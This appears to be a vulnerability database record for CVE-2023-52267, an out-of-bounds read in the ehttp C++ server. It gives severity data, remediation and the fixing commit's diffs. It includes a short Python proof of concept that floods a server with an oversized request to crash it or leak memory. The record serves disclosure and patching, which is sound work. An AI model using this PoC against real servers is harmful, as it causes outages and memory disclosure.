@@ -1,0 +1,62 @@
+{
+    "CVSSv3": {
+        "CVSS": "3.1",
+        "E": "P",
+        "attackVector": "NETWORK",
+        "attackComplexity": "LOW",
+        "privilegesRequired": "NONE",
+        "userInteraction": "NONE",
+        "scope": "UNCHANGED",
+        "confidentiality": "HIGH",
+        "integrity": "NONE",
+        "availability": "HIGH"
+    },
+    "credit": [
+        "Unknown"
+    ],
+    "cvssDetails": [],
+    "cvssScore": 9.1,
+    "disclosureTime": "2023-12-31 00:46:11",
+    "epssDetails": null,
+    "exploitMaturity": "Proof of Concept",
+    "id": "SNYK-UNMANAGED-HONGLIULIAOEHTTP-6141110",
+    "identifiers": {
+        "CVE": [
+            "CVE-2023-52267"
+        ],
+        "CWE": [
+            "CWE-125"
+        ]
+    },
+    "language": "cpp",
+    "malicious": false,
+    "packageManager": "unmanaged",
+    "publicationTime": "2023-12-31 18:19:50",
+    "remediation": "Upgrade hongliuliao/ehttp to version 1.0.6 or higher. ",
+    "severity": "critical",
+    "socialTrendAlert": false,
+    "title": "Out-of-bounds Read",
+    "vulnDescription": {
+        "Overview": "Affected versions of this package are vulnerable to Out-of-bounds Read due to improper handling of error logging for long strings in simple_log.cpp . An attacker can read sensitive information from memory or cause a crash by supplying a long string. ",
+        "PoC": "import socket sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect((\"localhost\", 8080)) sock.send(b\"GET\"*5000+b\" /hello\"*5000+b\" HTTP/1.1\\r\\nHost:localhost:8080\\r\\n\\r\\n\") response = sock.recv(4096) sock.close() "
+    },
+    "source_code": [
+        {
+            "filename": "Makefile",
+            "diff": "@@ -5,8 +5,8 @@ CXXFLAGS += -g -Wall\n LDFLAGS += -pthread\n \n ifdef ACOV\n-\tCXXFLAGS += -fprofile-arcs -ftest-coverage\n-\tLDFLAGS += -lgcov --coverage\n+\tCXXFLAGS += -fprofile-arcs -ftest-coverage -fsanitize=address\n+\tLDFLAGS += -lgcov --coverage -fsanitize=address\n endif\n \n MULTIPART_PARSER_INC_PATH=-I deps/multipart-parser-c/"
+        },
+        {
+            "filename": "src/epoll_socket.cpp",
+            "diff": "@@ -228,11 +228,6 @@ int EpollSocket::handle_accept_event(int &epollfd, epoll_event &event, EpollSock\n void read_func(void *data) {\n     TaskData *td = (TaskData *) data;\n     td->es->handle_readable_event(td->event);\n-\n-    EpollContext *hc = (EpollContext *) td->event.data.ptr;\n-    if (hc != NULL) {\n-        hc->_ctx_status = CONTEXT_READ_OVER;\n-    }\n     delete td;\n }\n \n@@ -248,6 +243,9 @@ int EpollSocket::handle_readable_event(epoll_event &event) {\n     if (ret == READ_CLOSE) {\n         return close_and_release(event);\n     }\n+    if (epoll_context != NULL) {\n+        epoll_context->_ctx_status = CONTEXT_READ_OVER;\n+    }\n \n     if (ret == READ_CONTINUE) {\n         event.events = EPOLLIN | EPOLLONESHOT;"
+        },
+        {
+            "filename": "src/sim_parser.cpp",
+            "diff": "@@ -577,7 +577,7 @@ int Request::parse_request(const char *read_buffer, int read_size) {\n         LOG_INFO(\"TOO BIG REQUEST WE WILL REFUSE IT! MAX_REQ_SIZE:%d\", MAX_REQ_SIZE);\n         return -1;\n     }\n-    LOG_DEBUG(\"read from client: size:%d, content:%s\", read_size, read_buffer);\n+    LOG_DEBUG(\"read from client: size:%d, content:%.4096s\", read_size, read_buffer);\n     ssize_t nparsed = http_parser_execute(&_parser, &_settings, read_buffer, read_size);\n     if (nparsed != read_size) {\n         std::string err_msg = \"unkonw\";"
+        },
+        {
+            "filename": "test/issue38/poc.py",
+            "diff": "@@ -0,0 +1,9 @@\n+#!/usr/bin/env python3\n+\n+import socket\n+\n+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n+sock.connect((\"localhost\", 8080))\n+sock.send(b\"GET\"*5000+b\" /hello\"*5000+b\" HTTP/1.1\\r\\nHost:localhost:8080\\r\\n\\r\\n\")\n+response = sock.recv(4096)\n+sock.close()"
+        }
+    ],
+    "commitTime": "2023-10-08 06:54:01"
+}
